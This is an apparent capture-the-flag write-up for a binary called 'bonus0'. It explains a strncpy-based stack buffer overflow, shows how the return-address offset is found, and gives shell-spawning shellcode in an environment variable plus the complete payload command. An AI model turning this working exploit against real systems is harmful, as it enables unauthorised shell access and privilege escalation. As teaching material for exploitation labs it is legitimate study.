looking at the code (see source.c) we can see that the program is vulnerable to a buffer overflow attack (like always).
it copy stdin into a buffer of 20 char using strncpy(dest, src, 20), but if src is greater than 20 bytes it will not be \0 terminated,
it means strcpy will read input1 AND input2 into the buffer since input1 doesn't have a end.

the main buffer of 54 bytes will overflow:
input1(20) + input2(20) + space(1) + input2(20) = 61 bytes
we will find the offset to overflow using https://wiremask.eu/tools/buffer-overflow-pattern-generator/ and gdb.
the tools tells us the offset it at 9 bytes.
so we need to put the address of our shellcode at the 9th byte of input2, that will write over the return address of the stack frame.

we will put the shellcode (from https://shell-storm.org/shellcode/files/shellcode-906.html) into a environment variable:
`export code=$(python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")`

getting the address of the shellcode:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv) {
  printf("%p\n", getenv(argv[1]));
}
```

`./a.out code` -> `0xbffff916`

4096 because of the read() syscall that read 4096 bytes from stdin for input1.
full payload:
`python -c "print 'i'*4095 + '\n' + 'i'*9 + '\x16\xf9\xff\xbf' + 'i'*7" > /tmp/a`
`cat /tmp/a - |./bonus0`
